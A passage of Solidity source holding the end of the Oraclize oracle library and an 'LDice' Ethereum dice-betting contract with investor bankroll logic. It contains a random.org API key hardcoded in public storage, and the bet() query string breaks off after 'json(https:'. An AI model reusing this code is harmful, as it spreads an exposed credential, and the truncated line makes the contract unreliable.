gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n function safeMemoryCleaner() internal pure {\n assembly {\n let fmem := mload(0x40)\n codecopy(fmem, codesize, sub(msize, fmem))\n }\n }\n}\ncontract LDice is usingOraclize {\n uint constant pwin = 5000;\n uint constant edge = 190;\n uint constant maxWin = 100;\n uint constant minBet = 10 finney;\n uint constant maxInvestors = 10;\n uint constant houseEdge = 500;\n uint constant divestFee = 100;\n uint constant emergencyWithdrawalRatio = 10;\n uint safeGas = 2300;\n uint constant ORACLIZE_GAS_LIMIT = 175000;\n uint constant INVALID_BET_MARKER = 99999;\n uint constant EMERGENCY_TIMEOUT = 12 hours;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n struct Bet {\n address playerAddress;\n uint amountBet;\n uint numberRolled;\n }\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n address public owner;\n address public houseAddress;\n bool public isStopped;\n string public randomOrgAPIKey = \"e1de2fda-77b3-4fa5-bdec-cd09c82bcff7\";\n WithdrawalProposal public proposedWithdrawal;\n mapping (bytes32 => Bet) public bets;\n bytes32[] public betsKeys;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n uint public totalWin = 0;\n event LOG_NewBet(address playerAddress, uint amount);\n event LOG_BetWon(address playerAddress, uint numberRolled, uint amountWon);\n event LOG_BetLost(address playerAddress, uint numberRolled);\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address withdrawalAddress, uint amountWithdrawn);\n event LOG_FailedSend(address receiver, uint amount);\n event LOG_ZeroSend();\n event LOG_InvestorEntrance(address investor, uint amount);\n event LOG_InvestorCapitalUpdate(address investor, int amount);\n event LOG_InvestorExit(address investor, uint amount);\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n event LOG_RandomOrgAPIKeyChanged(string oldKey, string newKey);\n event LOG_GasLimitChanged(uint oldGasLimit, uint newGasLimit);\n event LOG_EmergencyAutoStop();\n event LOG_EmergencyWithdrawalVote(address investor, bool vote);\n event LOG_ValueIsTooBig();\n event LOG_SuccessfulSend(address addr, uint amount);\n constructor() public {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n owner = msg.sender;\n houseAddress = msg.sender;\n }\n modifier onlyIfNotStopped {\n if (isStopped) throw;\n _;\n }\n modifier onlyIfStopped {\n if (!isStopped) throw;\n _;\n }\n modifier onlyInvestors {\n if (investorIDs[msg.sender] == 0) throw;\n _;\n }\n modifier onlyNotInvestors {\n if (investorIDs[msg.sender] != 0) throw;\n _;\n }\n modifier onlyOwner {\n if (owner != msg.sender) throw;\n _;\n }\n modifier onlyOraclize {\n if (msg.sender != oraclize_cbAddress()) throw;\n _;\n }\n modifier onlyMoreThanMinInvestment {\n if (msg.value <= getMinInvestment()) throw;\n _;\n }\n modifier onlyMoreThanZero {\n if (msg.value == 0) throw;\n _;\n }\n modifier onlyIfBetExist(bytes32 myid) {\n if(bets[myid].playerAddress == address(0x0)) throw;\n _;\n }\n modifier onlyIfBetSizeIsStillCorrect(bytes32 myid) {\n if ((((bets[myid].amountBet * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (bets[myid].amountBet >= minBet)) {\n _;\n }\n else {\n bets[myid].numberRolled = INVALID_BET_MARKER;\n safeSend(bets[myid].playerAddress, bets[myid].amountBet);\n return;\n }\n }\n modifier onlyIfValidRoll(bytes32 myid, string result) {\n uint numberRolled = parseInt(result);\n if ((numberRolled < 1 || numberRolled > 10000) && bets[myid].numberRolled == 0) {\n bets[myid].numberRolled = INVALID_BET_MARKER;\n safeSend(bets[myid].playerAddress, bets[myid].amountBet);\n return;\n }\n _;\n }\n modifier onlyWinningBets(uint numberRolled) {\n if (numberRolled - 1 < pwin) {\n _;\n }\n }\n modifier onlyLosingBets(uint numberRolled) {\n if (numberRolled - 1 >= pwin) {\n _;\n }\n }\n modifier onlyAfterProposed {\n if (proposedWithdrawal.toAddress == 0) throw;\n _;\n }\n modifier onlyIfProfitNotDistributed {\n if (!profitDistributed) {\n _;\n }\n }\n modifier onlyIfValidGas(uint newGasLimit) {\n if (ORACLIZE_GAS_LIMIT + newGasLimit < ORACLIZE_GAS_LIMIT) throw;\n if (newGasLimit < 25000) throw;\n _;\n }\n modifier onlyIfNotProcessed(bytes32 myid) {\n if (bets[myid].numberRolled > 0) throw;\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n if (proposedWithdrawal.atTime + EMERGENCY_TIMEOUT > now) throw;\n _;\n }\n modifier investorsInvariant {\n _;\n if (numInvestors > maxInvestors) throw;\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == maxInvestors) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getStatus()\n constant\n returns(uint, uint, uint, uint, uint, uint, uint, uint, uint) {\n uint bankroll = getBankroll();\n uint minInvestment = getMinInvestment();\n return (bankroll, pwin, edge, maxWin, minBet, (investorsProfit - investorsLosses), minInvestment, betsKeys.length, totalWin);\n }\n function getBet(uint id)\n constant\n returns(address, uint, uint) {\n if (id < betsKeys.length) {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].playerAddress, bets[betKey].amountBet, bets[betKey].numberRolled);\n }\n }\n function numBets()\n constant\n returns(uint) {\n return betsKeys.length;\n }\n function getMinBetAmount()\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n return oraclizeFee + minBet;\n }\n function getMaxBetAmount()\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n uint betValue = (maxWin * getBankroll()) * pwin / (10000 * (10000 - edge - pwin));\n return betValue + oraclizeFee;\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function changeOraclizeProofType(byte _proofType)\n onlyOwner {\n if (_proofType == 0x00) throw;\n oraclize_setProof( _proofType | proofStorage_IPFS );\n }\n function safeSend(address addr, uint value)\n private {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private\n onlyIfProfitNotDistributed {\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n if (copyInvested + investors[i].amountInvested >= copyInvested)\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function()\n payable {\n bet();\n }\n function bet()\n payable\n onlyIfNotStopped {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", ORACLIZE_GAS_LIMIT + safeGas);\n if (oraclizeFee >= msg.value) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n LOG_NewBet(msg.sender, betValue);\n string memory str1 = \"[URL] ['json(https:\n string memory str2 = randomOrgAPIKey;\n string memory str3 = \"\\\",\\\"n\\\":1,\\\"min\\\":1,\\\"max\\\":10000${[identity] \\\"}\\\"},\\\"id\\\":1${[identity] \\\"}\\\"}']\";\n string memory query = strConcat(str1, str2, str3);\n bytes32 myid =\n oraclize_query(\n \"nested\",\n query,\n ORACLIZE_GAS_LIMIT + safeGas\n );\n bets[myid] = Bet(msg.sender, betValue, 0);\n betsKeys.push(myid);\n }\n else {\n throw;\n }\n }\n function __callback(bytes32 myid, string result, bytes proof)\n onlyOraclize\n onlyIfBetExist(myid)\n onlyIfNotProcessed(myid)\n onlyIfValidRoll(myid, result)\n onlyIfBetSizeIsStillCorrect(myid) {\n uint numberRolled = parseInt(result);\n bets[myid].numberRolled = numberRolled;\n isWinningBet(bets[myid], numberRolled);\n isLosingBet(bets[myid], numberRolled);\n delete 